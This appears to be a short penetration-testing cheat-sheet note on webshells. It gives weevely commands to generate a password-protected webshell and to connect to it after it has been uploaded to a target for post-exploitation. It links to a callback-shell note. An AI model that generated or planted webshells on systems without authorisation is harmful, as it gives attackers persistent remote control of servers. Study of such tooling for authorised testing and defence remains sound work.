## Generate Webshell

^e8491c

Unlike the regular reverse/bind shells that we use to receive a connection. Webshells functions way differently that it doesn't require port forwarding nor a C2 server when sending commands from the attacker. It only requires a foothold to continue on the cyber intrusion.

Generate a weevely webshell

```
$ weevely generate <password> <path>
```

After succesfully uploading on the target's system we can finally move on to post exploitation phase.

```
$ weevely <URL> <password>
```

Navigate to the **Command and Control** section related to [[05 - Spawn Callback Shell|spawn callback shell]].